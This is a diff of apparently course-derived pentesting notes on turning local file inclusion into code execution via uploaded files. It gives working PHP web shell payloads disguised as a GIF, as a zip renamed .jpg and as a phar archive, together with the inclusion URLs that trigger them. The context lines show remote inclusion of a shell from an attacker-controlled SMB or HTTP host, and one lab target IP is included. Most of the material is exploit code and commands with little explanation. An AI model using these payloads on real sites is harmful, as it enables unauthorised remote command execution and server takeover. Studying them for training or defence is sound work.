@@ -260,3 +260,48 @@ impacket-smbserver -smb2support share $(pwd)
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 
 http://10.129.29.114/index.php?language=http://10.10.15.47/shell.php&cmd=cat%20/exercise/flag.txt
+
+# LFI and File Uploads
+
+# Image upload
+
+# Crafting Malicious Image
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+http://<SERVER_IP>:<PORT>/settings.php
+
+Uploaded File Path
+# Once we've uploaded our file, all we need to do is include it through the LFI vulnerability.
+# To include the uploaded file, we need to know the path to our uploaded file.
+# In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL.
+# In our case, if we inspect the source code after uploading the image, we can get its URL:
+
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+
+# Zip Upload
+
+# We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.
+# To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+
+# Phar Upload
+
+# Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
+
+Code: php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
